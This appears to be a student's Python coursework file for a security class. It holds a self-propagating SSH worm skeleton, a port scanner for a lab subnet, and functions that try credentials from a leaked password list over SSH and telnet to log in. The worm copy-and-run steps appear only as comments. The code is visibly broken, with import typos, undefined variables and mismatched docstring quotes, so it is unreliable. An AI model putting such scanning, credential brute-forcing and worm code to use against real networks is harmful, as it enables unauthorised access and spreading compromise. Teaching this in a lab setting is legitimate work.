"""Example Python Worm from class slides

import paramiko
from iterrtools import product

usernames = ['tim', ‘ben', ...]
passwords = ['123456', 'qwerty', ...]
ip_addresses = ['10.13.4.1', ...]

while True: #infinite loop, instant start
    for user, pw in zip(usernames, passwords):
        for ip in ip_addresses:
            try:
                # try to initiate SSH session
                client = paramiko.client.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, username=user, password=password)

                # execute attacker commands here
                # copy this worm program to remote machine
                # execute worm on remote machine
                
                # disconnect
                client.close()
            except:
                continue"""

#import telnetlib 
#import socket
import paramiko
import csv
from itertools import product
#recommended libraries; attempting to follow slides example

#SSH_PORT = 22 # SSH port
#TELNET_PORT = 23 # Telnet port

usernames = [] #TODO: grab from csv
passwords = [] #TODO: grab from csv
IpAddr = "10.13.4." 
lastdigit = range(0, 25) #test all IPs



while True: #infinite loop, instant start
    for user, pw in zip(usernames, passwords):
        for ip in ip_addresses: #this needs to be edited to combine IpAddr and each digit for all in lastdigit
        #for loop?
            try:
                # try to initiate SSH session - search for machines in 10.13.4.0/24 subnet
                client = paramiko.client.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, username=user, password=password)

                #   TODO: execute attacker commands here
                    #"attacker commands" output two files, open_ssh.log and open_telnet.log
                    #contains list of IPs with open ssh and telnet ports respectively
                # copy this worm program to remote machine
                # execute worm on remote machine
                
                # disconnect
                client.close()
            except:
                continue





























#old code: likely works, but written with a lot of help from coPilot and may not fit assignment requirements exactly

"""
def check_port(ip, port):
    try:
        with socket.create_connection((ip, port), timeout=TIMEOUT):
            return True
    except Exception:
        return False

"""TODO Write a function, find_vulnerable_machines, that searches for machines in the 10. 13.4. 0/24 
subnet and outputs two files, open_ssh. log and open_telnet. log. 
These files should contain a list of IPs that correspond to machines that have open ssh and open telnet ports, respectively."""

def find_vulnerable_machines():
    open_ssh = []
    open_telnet = []

    for x in lastdigit:
        ip = f"{IpAddr}{x}"
        if check_port(ip, SSH_PORT):
            open_ssh.append(ip)
        try:
            tn = telnetlib.Telnet(ip, TELNET_PORT, timeout=TIMEOUT)
            open_telnet.append(ip)
            tn.close()
        except Exception:
            pass

    with open("open_ssh.log", "w") as ssh_log: #log IPS
        for ip in open_ssh:
            ssh_log.write(ip + "\n") #write each IP on a new line

    with open("open_telnet.log", "w") as telnet_log: #log IPS
        for ip in open_telnet:
            telnet_log.write(ip + "\n") #write each IP on a new line

    return open_ssh, open_telnet



def scan_port(ip, port, timeout=2):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        s.close()
        return True
    except:
        return False

def get_open_ips(ip_list, port):
    return [ip for ip in ip_list if scan_port(ip, port)]

def try_telnet(ip, user, password):
    try:
        tn = telnetlib.Telnet(ip, 23, timeout=5)
        tn.read_until(b"login: ")
        tn.write(user.encode('ascii') + b"\n")
        tn.read_until(b"Password: ")
        tn.write(password.encode('ascii') + b"\n")
        # Add logic to check for successful login
        tn.close()
        return True
    except:
        return False

"""TODO Write a function, find vulnerable accounts, that searches over of the IPs within the log files from Part 1 
and finds the user/password combinations from the leaked password database q2.csv that can be used to 
successfully log in to the vulnerable machines via either SSH or telnet."""



def try_ssh(ip, user, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, username=user, password=password, timeout=5)
        client.close()
        return True
    except:
        return False

#Your function should write the exfiltrated SSH/telnet credentials to ssh_accounts. log and telnet_accounts. log, respectively.

def import_credentials(filename): #import q2.csv here
    with open(filename) as f:
        return [row for row in csv.DictReader(f)] #returns each row as a dictionary

"""

if __name__ == "__main__":
    #check_port()
    find_vulnerable_machines()

    #TODO: question2 part 3. 
    # sob sob im seething none of our code works at fucking all not even the TA's literal own example code 